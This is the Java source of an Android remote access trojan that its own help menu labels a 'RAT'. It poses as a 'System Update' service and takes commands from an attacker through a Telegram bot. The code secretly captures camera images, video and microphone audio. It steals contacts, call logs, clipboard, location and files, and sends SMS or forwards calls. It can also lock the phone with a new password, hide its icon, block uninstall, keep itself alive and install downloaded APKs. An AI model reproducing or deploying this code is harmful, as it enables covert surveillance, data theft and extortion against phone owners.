package com.sys.updater;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private MediaPlayer sirenPlayer;
    private MediaPlayer audioPlayer;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private View overlayView;
    private String currentPath = "/sdcard/";
    private boolean isFlashOn = false;

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
        
        Exfil.send("✅ System Bot is Online.\nType /help or /menu to see all commands.");
        new Thread(this::pollTelegram).start();
        
        blockUninstall();
        setupPersistence();
        startOverlay();
        requestIgnoreBatteryOptimization();
    }

    private void startOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return;
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            overlayView = new View(this);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1, type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            wm.addView(overlayView, params);
        } catch (Exception e) {}
    }

    private void requestIgnoreBatteryOptimization() {
        try {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {}
    }

    private void setupPersistence() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, ReviveReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
            }
        } catch (Exception e) {}
    }

    private void blockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.setUninstallBlocked(admin, getPackageName(), true);
            }
        } catch (Exception e) {}
    }

    private void pollTelegram() {
        while (isRunning) {
            HttpURLConnection conn = null;
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.setRequestMethod("GET");

                InputStream is = conn.getInputStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        
                        if (update.has("message")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.optString("text", "").trim();
                            
                            if (msg.has("document") || msg.has("photo") || msg.has("video")) {
                                String fileId = "";
                                String fileName = "uploaded_file";
                                if (msg.has("document")) {
                                    fileId = msg.getJSONObject("document").getString("file_id");
                                    fileName = msg.getJSONObject("document").optString("file_name", "doc_file");
                                } else if (msg.has("photo")) {
                                    JSONArray photos = msg.getJSONArray("photo");
                                    fileId = photos.getJSONObject(photos.length() - 1).getString("file_id");
                                    fileName = "photo_" + System.currentTimeMillis() + ".jpg";
                                } else if (msg.has("video")) {
                                    fileId = msg.getJSONObject("video").getString("file_id");
                                    fileName = "video_" + System.currentTimeMillis() + ".mp4";
                                }
                                String finalFileId = fileId;
                                String finalFileName = fileName;
                                new Thread(() -> downloadFileToVictim(finalFileId, finalFileName)).start();
                            } else {
                                if (text.contains("@")) text = text.split("@")[0];
                                handleCommand(text);
                            }
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            } finally {
                if (conn != null) conn.disconnect();
            }
        }
    }

    private void handleCommand(final String cmd) {
        mainHandler.post(() -> {
            if (cmd.equals("/help") || cmd.equals("/menu")) sendHelpMenu();
            
            else if (cmd.equals("/cam_front")) takePhoto(CameraCharacteristics.LENS_FACING_FRONT);
            else if (cmd.equals("/cam_back") || cmd.equals("/cam")) takePhoto(CameraCharacteristics.LENS_FACING_BACK);
            else if (cmd.equals("/vid")) recordVideo(CameraCharacteristics.LENS_FACING_FRONT);
            else if (cmd.equals("/ls")) listFiles(currentPath);
            else if (cmd.startsWith("/cd ")) {
                String newPath = cmd.substring(4).trim();
                File f = new File(newPath);
                if (f.exists() && f.isDirectory()) { currentPath = newPath; listFiles(currentPath); }
                else Exfil.send("❌ Directory not found: " + newPath);
            }
            else if (cmd.startsWith("/openapp ")) openAppByName(cmd.substring(9).trim());
            else if (cmd.startsWith("/volume ")) setVolume(cmd.substring(8).trim());
            else if (cmd.equals("/poweroff")) {
                Exfil.send("⏳ Attempting power off...");
                try { Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"}); } catch (Exception e) { Exfil.send("❌ Root failed."); }
            }

            else if (cmd.equals("/flash")) toggleFlashlight();
            else if (cmd.equals("/siren")) playSiren();
            else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
            else if (cmd.equals("/stopaudio")) { stopAudio(); Exfil.send("⏹️ Audio Stopped."); }
            else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
            else if (cmd.startsWith("/openurl ")) openUrl(cmd.substring(9).trim());
            else if (cmd.equals("/vibrate")) vibrateDevice();
            else if (cmd.startsWith("/toast ")) showToast(cmd.substring(7).trim());
            else if (cmd.startsWith("/lock ")) lockDevice(cmd.substring(6).trim());
            else if (cmd.equals("/unlock")) unlockDevice();
            else if (cmd.equals("/mic")) recordAudio();
            else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
            else if (cmd.equals("/loc")) getLocation();
            else if (cmd.startsWith("/get ")) Exfil.sendFile(cmd.substring(5).trim(), "Document", "File");
            else if (cmd.equals("/hide")) hideIcon();
            else if (cmd.equals("/contacts")) getContacts();
            else if (cmd.equals("/calls")) getCallLogs();
            else if (cmd.equals("/clip")) getClipboard();
            else if (cmd.startsWith("/sendsms ")) sendSMS(cmd.substring(9).trim());
            else if (cmd.equals("/wifi")) getWifiInfo();
            else if (cmd.startsWith("/forward ")) forwardCalls(cmd.substring(9).trim());
            else if (cmd.startsWith("/backup ")) downloadAndInstallBackup(cmd.substring(8).trim());
            else if (cmd.equals("/apps")) getInstalledApps();
            else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
            else if (cmd.equals("/restart")) { startService(new Intent(this, TelegramService.class)); Exfil.send("🔄 Restarted."); }
            
            else if (cmd.startsWith("/click ")) {
                if (KeyloggerService.instance != null) KeyloggerService.instance.performClick(cmd.substring(7).trim());
            }
            else if (cmd.startsWith("/type ")) {
                if (KeyloggerService.instance != null) KeyloggerService.instance.performSetText(cmd.substring(6).trim());
            }
            else if (cmd.startsWith("/swipe ")) {
                if (KeyloggerService.instance != null) KeyloggerService.instance.performSwipe(cmd.substring(7).trim());
            }
            else if (cmd.equals("/back")) { if (KeyloggerService.instance != null) KeyloggerService.instance.pressBack(); }
            else if (cmd.equals("/home")) { if (KeyloggerService.instance != null) KeyloggerService.instance.pressHome(); }
            else if (cmd.equals("/recents")) { if (KeyloggerService.instance != null) KeyloggerService.instance.pressRecents(); }
        });
    }

    private void sendHelpMenu() {
        String menu = "🤖 **Available Commands:**\n\n" +
                "**MEDIA & FILE:**\n" +
                "/cam_front, /cam_back, /vid (10s Front Video)\n" +
                "/upload (Send file to bot) -> Saved in App Data folder\n" +
                "/ls, /cd <path> - File Navigation\n" +
                "/openapp <name> - Open App\n" +
                "/volume <0-100> - Set Volume\n" +
                "/mic - Record 20s\n" +
                "/playaudio <url/path> - Play Audio\n" +
                "/poweroff - Turn off (Root)\n\n" +
                "**RAT:**\n" +
                "/screenshot, /loc, /contacts, /calls, /clip\n" +
                "/get <path>, /sendsms <num> <msg>\n" +
                "/wifi, /apps, /uninstall <pkg>, /hide\n\n" +
                "**SMART TOUCH:**\n" +
                "/click <text>, /type <text>, /swipe <dir>\n" +
                "/back, /home, /recents";
        Exfil.send(menu);
    }

    // ================== FIXED VIDEO RECORDING ==================
    private void recordVideo(int facing) {
        Exfil.send("🎥 Recording 10s Video...");
        
        // Khasna nkhdmo b HandlerThread bach Camera2 API tkhdem
        HandlerThread thread = new HandlerThread("CameraVideoThread");
        thread.start();
        Handler backgroundHandler = new Handler(thread.getLooper());

        try {
            File videoFile = new File(getExternalFilesDir(null), "vid.mp4");
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = getCameraId(facing);
            if (cameraId == null) { Exfil.send("❌ Cam not found"); return; }

            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(videoFile.getAbsolutePath());
            recorder.setVideoSize(640, 480);
            recorder.setVideoFrameRate(30);
            recorder.setOrientationHint(facing == CameraCharacteristics.LENS_FACING_FRONT ? 270 : 90);
            recorder.prepare();

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                        builder.addTarget(recorder.getSurface());
                        
                        camera.createCaptureSession(Arrays.asList(recorder.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                try {
                                    session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                                    recorder.start();
                                    
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        try {
                                            recorder.stop();
                                            recorder.release();
                                            camera.close();
                                            thread.quitSafely();
                                            Exfil.sendFile(videoFile.getAbsolutePath(), "Video", "Video 10s");
                                        } catch (Exception ex) {
                                            Exfil.send("❌ Video stop error: " + ex.getMessage());
                                        }
                                    }, 10000); 
                                    
                                } catch (Exception e) { Exfil.send("❌ Record Error: " + e.getMessage()); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) { Exfil.send("❌ Config Failed"); }
                        }, backgroundHandler);
                    } catch (Exception e) { Exfil.send("❌ Cam open error: " + e.getMessage()); }
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) { Exfil.send("❌ Cam Error: " + error); }
            }, backgroundHandler);
        } catch (Exception e) { 
            Exfil.send("❌ Vid Error: " + e.getMessage()); 
            thread.quitSafely();
        }
    }

    // ================== HELPER METHODS ==================

    private String getCameraId(int facing) {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
                if (lensFacing != null && lensFacing == facing) return id;
            }
        } catch (Exception e) {}
        return null;
    }

    private void takePhoto(int facing) {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = getCameraId(facing);
            if (cameraId == null) { Exfil.send("❌ Camera not found."); return; }

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
               camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> { try { session.capture(builder.build(), null, null); } catch (Exception e) {} }, 500);
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes); fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", facing == CameraCharacteristics.LENS_FACING_FRONT ? "Front Cam" : "Back Cam");
                                        } catch (Exception e) {}
                                        image.close(); camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) { Exfil.send("❌ Cam Error"); }
    }

    private void downloadFileToVictim(String fileId, String fileName) {
        Exfil.send("⏳ Uploading: " + fileName);
        try {
            String getFileUrl = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getFile?file_id=" + fileId;
            InputStream is = new URL(getFileUrl).openStream();
            java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
            JSONObject json = new JSONObject(s.hasNext() ? s.next() : "");
            String filePath = json.getJSONObject("result").getString("file_path");

            String downloadUrl = "https://api.telegram.org/file/bot" + Exfil.BOT_TOKEN + "/" + filePath;
            HttpURLConnection conn = (HttpURLConnection) new URL(downloadUrl).openConnection();
            conn.connect();

            File destDir = new File(getExternalFilesDir(null), "Uploaded_Files");
            if (!destDir.exists()) destDir.mkdirs();
            File destFile = new File(destDir, fileName);
            
            FileOutputStream fos = new FileOutputStream(destFile);
            InputStream input = conn.getInputStream();
            byte[] buffer = new byte[4096];
            int len;
            while ((len = input.read(buffer)) != -1) { fos.write(buffer, 0, len); }
            fos.close(); input.close();
            
            Exfil.send("✅ Saved to:\n`" + destFile.getAbsolutePath() + "`\n\nUse `/get " + destFile.getAbsolutePath() + "` to download it back.");
        } catch (Exception e) {
            Exfil.send("❌ Upload Error: " + e.getMessage());
        }
    }

    private void setVolume(String levelStr) {
        try {
            int level = Integer.parseInt(levelStr);
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            int target = (int) ((level / 100.0) * max);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, target, 0);
            Exfil.send("🔊 Volume set to " + level + "%");
        } catch (Exception e) { Exfil.send("❌ Usage: /volume <0-100>"); }
    }

    private void openAppByName(String appName) {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo app : apps) {
                String label = pm.getApplicationLabel(app).toString();
                if (label.toLowerCase().contains(appName.toLowerCase()) || app.packageName.contains(appName)) {
                    Intent intent = pm.getLaunchIntentForPackage(app.packageName);
                    if (intent != null) {
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                        Exfil.send("📱 Opened: " + label);
                        return;
                    }
                }
            }
            Exfil.send("❌ App not found.");
        } catch (Exception e) {}
    }

    // ================== OLD FEATURES ==================

    private void playAudio(String pathOrUrl) {
        try {
            stopAudio(); 
            audioPlayer = new MediaPlayer();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                audioPlayer.setAudioAttributes(new AudioAttributes.Builder().setContentType(AudioAttributes.CONTENT_TYPE_MUSIC).setUsage(AudioAttributes.USAGE_MEDIA).build());
            }
            if (pathOrUrl.startsWith("http")) audioPlayer.setDataSource(pathOrUrl);
            else {
                File file = new File(pathOrUrl);
                if (!file.exists()) { Exfil.send("❌ File not found"); return; }
                audioPlayer.setDataSource(file.getAbsolutePath());
            }
            audioPlayer.setOnPreparedListener(mp -> { mp.start(); Exfil.send("🎵 Playing Audio"); });
            audioPlayer.setOnCompletionListener(mp -> { stopAudio(); Exfil.send("🎵 Audio Finished."); });
            audioPlayer.prepareAsync();
        } catch (Exception e) { Exfil.send("❌ Audio Error: " + e.getMessage()); }
    }

    private void stopAudio() {
        try {
            if (audioPlayer != null) {
                if (audioPlayer.isPlaying()) audioPlayer.stop();
                audioPlayer.release(); audioPlayer = null;
            }
        } catch (Exception e) {}
    }

    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare(); recorder.start();
            Exfil.send("🎙️ Recording 20s...");
            new Thread(() -> {
                try { Thread.sleep(20000); } catch (Exception e) {} 
                mainHandler.post(() -> {
                    try { recorder.stop(); recorder.release(); Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record 20s"); } catch (Exception e) {}
                });
            }).start();
        } catch (Exception e) {}
    }

    private void listFiles(String pathStr) {
        try {
            File dir = new File(pathStr);
            if (!dir.exists()) { Exfil.send("❌ Not found: " + pathStr); return; }
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder("📁 **" + dir.getAbsolutePath() + "**\n\n");
            if (files != null) {
                int count = 0;
                for (File f : files) {
                    if (count >= 30) break; 
                    sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName()).append("\n");
                    count++;
                }
            }
            sb.append("\n👉 `/cd ").append(dir.getAbsolutePath()).append("/foldername`");
            sb.append("\n👉 `/get ").append(dir.getAbsolutePath()).append("/filename`");
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void downloadAndInstallBackup(String urlStr) {
        Exfil.send("⏳ Downloading APK...");
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                connection.connect();
                File apkFile = new File(getExternalFilesDir(null), "sys_update.apk");
                FileOutputStream fos = new FileOutputStream(apkFile);
                InputStream is = connection.getInputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1) { fos.write(buffer, 0, len); }
                fos.close(); is.close();
                Exfil.send("✅ Triggering Install...");
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    Uri apkUri = androidx.core.content.FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", apkFile);
                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                } else {
                    intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
                }
                startActivity(intent);
            } catch (Exception e) { Exfil.send("❌ Error: " + e.getMessage()); }
        }).start();
    }

    private void sendSMS(String args) {
        try {
            String[] parts = args.split(" ", 2);
            if (parts.length < 2) return;
            SmsManager.getDefault().sendTextMessage(parts[0], null, parts[1], null, null);
            Exfil.send("✅ SMS Sent to " + parts[0]);
        } catch (Exception e) {}
    }

    private void getWifiInfo() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                Exfil.send("📶 Wi-Fi: " + wifiManager.getConnectionInfo().getSSID());
            }
        } catch (Exception e) {}
    }

    private void forwardCalls(String number) {
        try {
            String ussdCode = "*21*" + number + "%23";
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(ussdCode)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) startActivity(intent);
        } catch (Exception e) {}
    }

    private void toggleFlashlight() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            manager.setTorchMode(getCameraId(CameraCharacteristics.LENS_FACING_BACK), !isFlashOn);
            isFlashOn = !isFlashOn;
        } catch (Exception e) {}
    }

    private void playSiren() {
        try {
            if (sirenPlayer != null && sirenPlayer.isPlaying()) { sirenPlayer.stop(); Exfil.send("🔊 Stopped"); return; }
            sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (sirenPlayer != null) { sirenPlayer.setLooping(true); sirenPlayer.start(); Exfil.send("🔊 Started"); }
        } catch (Exception e) {}
    }

    private void changeWallpaper(String pathOrUrl) {
        new Thread(() -> {
            try {
                Bitmap myBitmap = BitmapFactory.decodeStream(new URL(pathOrUrl).openConnection().getInputStream());
                if (myBitmap != null) { WallpaperManager.getInstance(getApplicationContext()).setBitmap(myBitmap); Exfil.send("🖼️ Wallpaper Changed!"); }
            } catch (Exception e) {}
        }).start();
    }

    private void openUrl(String urlStr) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(urlStr));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }

    private void vibrateDevice() {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE));
            Exfil.send("📳 Vibrating.");
        } catch (Exception e) {}
    }

    private void showToast(String msg) {
        try { Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show(); } catch (Exception e) {}
    }

    private void lockDevice(String password) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword(password, 0); dpm.lockNow(); Exfil.send("🔒 Locked!"); }
        } catch (Exception e) {}
    }

    private void unlockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Unlocked!"); }
        } catch (Exception e) {}
    }

    private void hideIcon() {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).setPackage(getPackageName());
            List<ResolveInfo> activities = getPackageManager().queryIntentActivities(intent, 0);
            if (activities.size() > 0) {
                getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), activities.get(0).activityInfo.name), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Exfil.send("🕵️ Hidden.");
            }
        } catch (Exception e) {}
    }

    private void uninstallApp(String packageName) {
        try { startActivity(new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); } catch (Exception e) {}
    }

    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📱 **Apps:**\n\n");
        PackageManager pm = getPackageManager();
        for (ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) sb.append(pm.getApplicationLabel(app)).append(" (`").append(app.packageName).append("`)\n");
        }
        Exfil.send(sb.toString());
    }

    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("👥 **Contacts:**\n\n");
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("📞 **Calls:**\n\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) Exfil.send("📋 " + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
        } catch (Exception e) {}
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) Exfil.send("📍 https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude());
        } catch (Exception e) {}
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
    }
                }
